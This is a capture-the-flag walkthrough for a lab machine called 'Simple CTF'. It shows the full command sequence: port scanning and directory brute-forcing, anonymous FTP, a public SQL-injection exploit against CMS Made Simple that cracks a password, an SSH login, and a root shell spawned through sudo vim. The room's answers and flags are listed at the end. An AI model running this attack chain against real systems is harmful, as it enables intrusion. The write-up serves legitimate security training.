# Task 1 [Simple CTF]
----

>>Deploy the machine and attempt the questions!

----

# MY DOCUMENTATION:
----

>>USING NMAP TO GET SOME INFORMATION. 

```bash
root@ip-10-10-8-2:~# nmap -sC -sV 10.10.106.232

Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-02 15:07 GMT
Nmap scan report for ip-10-10-106-232.eu-west-1.compute.internal (10.10.106.232)
Host is up (0.00047s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.8.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (EdDSA)
MAC Address: 02:E5:A3:AF:72:2B (Unknown)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.38 seconds

root@ip-10-10-8-2:~# gobuster dir -u http://10.10.106.232 -w /usr/share/wordlists/dirb/big.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.106.232
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/12/02 15:29:20 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2021/12/02 15:29:23 Finished
===============================================================

```

>>CONTENTS IN THE ROBOTS.TXT OF THE WEBSITE.

```bash
#
# "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $"
#
#   This file tells search engines not to index your CUPS server.
#
#   Copyright 1993-2003 by Easy Software Products.
#
#   These coded instructions, statements, and computer programs are the
#   property of Easy Software Products and are protected by Federal
#   copyright law.  Distribution and use rights are outlined in the file
#   "LICENSE.txt" which should have been included with this file.  If this
#   file is missing or damaged please contact Easy Software Products
#   at:
#
#       Attn: CUPS Licensing Information
#       Easy Software Products
#       44141 Airport View Drive, Suite 204
#       Hollywood, Maryland 20636-3111 USA
#
#       Voice: (301) 373-9600
#       EMail: cups-info@cups.org
#         WWW: http://www.cups.org
#

User-agent: *
Disallow: /


Disallow: /openemr-5_0_1_3 
#
# End of "$Id: robots.txt 3494 2003-03-19 15:37:44Z mike $".
#
```

>>LOGGING IN INTO THE FTP SERVER TO SEE ANY INFORMATION.

```bash
root@ip-10-10-8-2:~# ftp 10.10.106.232
Connected to 10.10.106.232.
220 (vsFTPd 3.0.3)
Name (10.10.106.232:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (206.2460 kB/s)
ftp> 

root@ip-10-10-8-2:~# cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!

```

>>WEB CONTENTS IN THE WEBSITE

```text

Pentest it

    Home
    How CMSMS Works
        Templates and stylesheets
        Pages and navigation
        Content
        Menu Manager
        Extensions
        Event Manager
        Workflow
        Where do i get help?
    Default Templates Explained
        CMSMS tags in the templates
        Left simple navigation + 1 column
        Top simple navigation + left subnavigation + 1 column
        CSSMenu top + 2 columns
        CSSMenu left + 1 column
        Minimal template
        Higher End
            NCleanBlue
            ShadowMenu Tab + 2 columns
            Simplex Theme
    Default Extensions
        Modules
            News
            Menu Manager
            Theme Manager
            MicroTiny
            Search
            Module Manager
        Tags
            Tags in the core
            User Defined Tags

Power for professionals
Simplicity for End Users
Search:

    Power for professionals
```

>>SEARCHING THE EXPLOIT AND USING IT FIND THE PASSWORD.

```bash
root@ip-10-10-8-2:~# searchsploit -m 46635
[i] Found (#2): /opt/searchsploit/files_exploits.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_exploits.csv" (package_array: exploitdb)

[i] Found (#2): /opt/searchsploit/files_shellcodes.csv
[i] To remove this message, please edit "/opt/searchsploit/.searchsploit_rc" for "files_shellcodes.csv" (package_array: exploitdb)

  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /opt/searchsploit/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /root/46635.py


root@ip-10-10-8-2:~# ls
46635.py   ForMitch.txt  Postman  thinclient_drives
Desktop    Instructions  Rooms    Tools
Downloads  Pictures      Scripts
root@ip-10-10-8-2:~# 

root@ip-10-10-8-2:~# python simple.py -u http://10.10.0.236/simple --crack -w /usr/share/wordlists/rockyou.txt

[+] Salt for password found:
[+] Username found : mitchy
[+] Email Found : admin@admin.com 
[+] Password Found : 0c01f4469bd75d7a84c7eb73846e8d96
[+] Password Cracked : secret
```

>>LOGGING IN SSH WITH CREDS WE FOUND AND PIVILEGE ESCALATING TO GET THE ROOT FLAG.

```bash
root@ip-10-10-8-2:~# ssh mitch@10.10.106.232 -p 2222
The authenticity of host '[10.10.106.232]:2222 ([10.10.106.232]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[10.10.106.232]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.106.232's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
$ sudo -l
  User mitch may run the following commands on Machine:
   (root) NOPASSWD: /usr/bin/vim
$ sudo vim -c ":!/bin/sh"
#
# cd sunbath
# ls
Desktop    Downloads         Music     Public     Videos
Documents  examples.desktop  Pictures  Templates
# cd root
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!

```

----

# Answer the questions below

1.How many services are running under port 1000?
>>2

2.What is running on the higher port?
>>SSH

3.What's the CVE you're using against the application?
>>CVE-2019-9053

4.To what kind of vulnerability is the application vulnerable?
>>SQLI

5.What's the password?
>>SECRET

6.Where can you login with the details obtained?
>>SSH

7.What's the user flag?
>>G00d j0b, keep up!

8.Is there any other user in the home directory? What's its name?
>>sunbath

9.What can you leverage to spawn a privileged shell?
>>vim

10.What's the root flag?
>>W3ll d0n3. You made it!

----